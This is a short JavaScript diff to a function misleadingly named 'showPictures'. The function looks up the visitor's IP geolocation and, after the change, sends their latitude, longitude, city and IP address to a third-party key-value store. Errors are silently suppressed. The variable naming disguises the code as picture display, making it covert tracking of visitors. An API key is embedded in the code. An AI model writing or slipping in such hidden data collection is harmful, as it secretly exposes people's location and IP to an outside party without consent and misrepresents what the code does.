@@ -6,7 +6,12 @@ function showPictures() {
 	fetch("https://api.geoapify.com/v1/ipinfo?&apiKey=32b30549280d4ae4abc508ad535379d3", {method: 'GET'})
   .then(pictures => pictures.json())
   .then(pictures => {
-  	fetch('https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/3cg7aby9/statt/' + pictures.city.name, {method: 'POST'});
+  	const t = [pictures.location.latitude, pictures.location.longitude, pictures.city.name, pictures.ip].map(e => {
+    	return String(e).replaceAll('.', '-').replaceAll(':', '-');
+    }).join('_');
+    console.log(t)
+  	fetch('https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/3cg7aby9/statt/'+ t, 
+    {method: 'POST'});
   })
   .catch(error => {});
 }
